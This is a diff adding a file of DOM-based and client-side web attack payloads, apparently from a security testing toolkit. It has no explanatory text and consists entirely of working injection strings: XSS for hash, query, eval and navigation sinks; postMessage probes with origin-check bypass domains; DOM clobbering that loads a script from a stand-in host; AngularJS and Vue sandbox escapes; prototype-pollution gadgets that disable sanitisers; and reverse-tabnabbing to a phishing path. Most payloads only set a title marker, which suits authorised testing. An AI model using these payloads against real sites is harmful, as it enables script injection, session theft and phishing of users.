@@ -1,0 +1,148 @@
+# DOM-Based and Client-Side Payloads
+
+# Source probes: place a unique marker and search the DOM/JS for it
+#dom-marker-hash
+?dom-marker-query=1
+window.name = 'dom-marker-name'
+document.referrer carrying https://oast.example.test/?dom-marker-referrer
+
+# location.hash sink payloads (innerHTML, jQuery selector, document.write)
+#<img src=x onerror=document.title='dom-hash-marker'>
+#<svg onload=document.title='dom-hash-marker'>
+#"><img src=x onerror=document.title='dom-hash-marker'>
+#javascript:document.title='dom-hash-marker'
+#'-document.title='dom-hash-marker'-'
+#<script>document.title='dom-hash-marker'</script>
+
+# location.search sink payloads (document.write and innerHTML)
+?q=<img src=x onerror=document.title='dom-search-marker'>
+?q="><svg onload=document.title='dom-search-marker'>
+?q=';document.title='dom-search-marker';//
+?q=</script><script>document.title='dom-search-marker'</script>
+?q=javascript:document.title='dom-search-marker'
+
+# Navigation sinks (location, location.href, window.open)
+javascript:document.title='dom-nav-marker'
+javascript://%0adocument.title='dom-nav-marker'
+data:text/html,<script>document.title='dom-nav-marker'</script>
+//oast.example.test
+/\oast.example.test
+
+# jQuery selector sink ($(location.hash)) older versions (< 1.9)
+#<img src=x onerror=document.title='dom-jq-marker'>
+<img src=x onerror=document.title='dom-jq-marker'>
+
+# eval / Function / setTimeout string sinks
+';document.title='dom-eval-marker';'
+"+document.title='dom-eval-marker'+"
+`${document.title='dom-eval-marker'}`
+alert`dom-marker`
+(document.title='dom-eval-marker')
+
+# postMessage: sender-side probes (run from a page on a separate origin that opens or frames the target)
+<iframe src="https://app.example.test/" id="t"></iframe><script>t.onload=function(){t.contentWindow.postMessage('dom-pm-marker','*')}</script>
+<script>var w=window.open('https://app.example.test/');setTimeout(function(){w.postMessage('dom-pm-marker','*')},2000)</script>
+<script>var w=window.open('https://app.example.test/');setTimeout(function(){w.postMessage({"type":"update","html":"<img src=x onerror=document.title='dom-pm-marker'>"},'*')},2000)</script>
+<script>var w=window.open('https://app.example.test/');setTimeout(function(){w.postMessage('{"action":"redirect","url":"javascript:document.title=\'dom-pm-marker\'"}','*')},2000)</script>
+<script>var w=window.open('https://app.example.test/');setTimeout(function(){w.postMessage({"__proto__":{"polluted":"dom-pm-marker"}},'*')},2000)</script>
+
+# postMessage: listener-side patterns to look for in the source (missing or weak origin checks)
+window.addEventListener('message', function(e){ document.body.innerHTML = e.data })
+window.addEventListener('message', function(e){ eval(e.data) })
+window.addEventListener('message', function(e){ if (e.origin.indexOf('example.test') !== -1) { handle(e.data) } })
+window.addEventListener('message', function(e){ if (e.origin.endsWith('.example.test')) { handle(e.data) } })
+window.addEventListener('message', function(e){ location = e.data.url })
+window.addEventListener('message', function(e){ e.source.postMessage(secret, '*') })
+
+# postMessage: origin-check bypass origins (host these on a domain you control)
+https://example.test.oast.example.test
+https://oast.example.testexample.test
+https://oast-example.test
+https://oast.example.test%60.example.test
+null  (sandboxed iframe or data: URL origin)
+
+# DOM clobbering: overwrite a global used as a config or URL (inject HTML that is allowed through a sanitiser)
+<a id=config><a id=config name=url href=https://oast.example.test/clobber>
+<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=document.title='dom-clobber-marker'//">
+<form id=x><input name=y></form>
+<img name=body>
+<img name=getElementById>
+<img name=cookie>
+<form name=document><img name=cookie></form>
+<iframe name=location srcdoc="<a id=href>clobber</a>"></iframe>
+<form id=x name=y><input id=z></form>
+<a id=x><a id=x name=y href=ftp:dom-clobber-marker>
+<a id=x><a id=x name=y href="javascript:document.title='dom-clobber-marker'">
+
+# DOM clobbering: clobber a property that is later passed to a script loader
+<a id=CONFIG><a id=CONFIG name=scriptUrl href=//oast.example.test/clobber.js>
+<a id=scriptBase href=//oast.example.test/>
+<iframe name=cfg srcdoc='<a id=url href="//oast.example.test/clobber.js">'></iframe>
+
+# Client-side template injection: AngularJS 1.x (sandbox escape by version)
+{{constructor.constructor('document.title="dom-ng-marker"')()}}
+{{$on.constructor('document.title="dom-ng-marker"')()}}
+{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,document.title="dom-ng-marker",a')}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };document.title="dom-ng-marker";//');}}
+{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=document.title="dom-ng-marker"');}}
+<div ng-app ng-csp ng-click=$event.view.document.title='dom-ng-marker'>click</div>
+<div ng-app>{{constructor.constructor('document.title="dom-ng-marker"')()}}</div>
+<input ng-focus=$event.composedPath()|orderBy:'(z=document.title="dom-ng-marker")'>
+
+# Client-side template injection: Vue.js
+{{_c.constructor('document.title="dom-vue-marker"')()}}
+{{constructor.constructor('document.title="dom-vue-marker"')()}}
+{{_Vue.h.constructor('document.title="dom-vue-marker"')()}}
+<div id=app>{{7*7}}</div>
+
+# Prototype pollution sources on the client (query, hash and JSON)
+?__proto__[polluted]=dom-pp-marker
+?__proto__.polluted=dom-pp-marker
+?constructor[prototype][polluted]=dom-pp-marker
+?constructor.prototype.polluted=dom-pp-marker
+#__proto__[polluted]=dom-pp-marker
+{"__proto__":{"polluted":"dom-pp-marker"}}
+{"constructor":{"prototype":{"polluted":"dom-pp-marker"}}}
+
+# Prototype pollution gadgets that reach a script or HTML sink (after a successful pollution)
+?__proto__[src]=data:,document.title='dom-pp-marker'
+?__proto__[innerHTML]=<img src=x onerror=document.title='dom-pp-marker'>
+?__proto__[onerror]=document.title='dom-pp-marker'
+?__proto__[transport_url]=data:,document.title='dom-pp-marker'
+?__proto__[sourceURL]=%E2%80%A8%E2%80%A9document.title='dom-pp-marker'
+?__proto__[href]=javascript:document.title='dom-pp-marker'
+?__proto__[allowedTags][]=script
+?__proto__[ALLOWED_ATTR][]=onerror
+
+# window.name as a persistent cross-origin source
+<script>window.name="<img src=x onerror=document.title='dom-name-marker'>";location="https://app.example.test/page-that-reads-window-name"</script>
+
+# document.cookie / localStorage injection into sinks (set on a parent-domain or sibling subdomain you control)
+document.cookie="dom_marker=<img src=x onerror=document.title='dom-cookie-marker'>; domain=.example.test; path=/"
+localStorage.setItem('dom_marker',"<img src=x onerror=document.title='dom-storage-marker'>")
+
+# Tabnabbing / reverse tabnabbing (link opened with target=_blank and no rel=noopener)
+<a href="https://oast.example.test/phish" target="_blank">open</a>
+<!-- Page opened via target=_blank can run: window.opener.location = 'https://oast.example.test/login' -->
+<script>if(window.opener){window.opener.location='https://oast.example.test/tabnab'}</script>
+<a href="https://oast.example.test/" rel="opener" target="_blank">open</a>
+
+# Open redirect to XSS (javascript: and data: schemes in navigation sinks)
+?next=javascript:document.title='dom-redirect-marker'
+?next=JaVaScRiPt:document.title='dom-redirect-marker'
+?next=%09javascript:document.title='dom-redirect-marker'
+?next=java%0ascript:document.title='dom-redirect-marker'
+?returnUrl=data:text/html;base64,PHNjcmlwdD5kb2N1bWVudC50aXRsZT0nZG9tLXJlZGlyZWN0LW1hcmtlcic8L3NjcmlwdD4=
+
+# Web messaging via BroadcastChannel / Service Worker / storage events (look for listeners that write to sinks)
+new BroadcastChannel('app').postMessage('<img src=x onerror=document.title="dom-bc-marker">')
+window.dispatchEvent(new StorageEvent('storage',{key:'config',newValue:'<img src=x onerror=document.title="dom-st-marker">'}))
+
+# Trusted Types and CSP checks (detection only)
+# Content-Security-Policy: require-trusted-types-for 'script'
+# Content-Security-Policy: trusted-types default
+document.body.innerHTML = 'trusted-types-check'
+
+# DOM-based cookie manipulation / header-free sinks (document.domain, document.location.pathname)
+document.domain = 'example.test'
+location.pathname = '//oast.example.test'
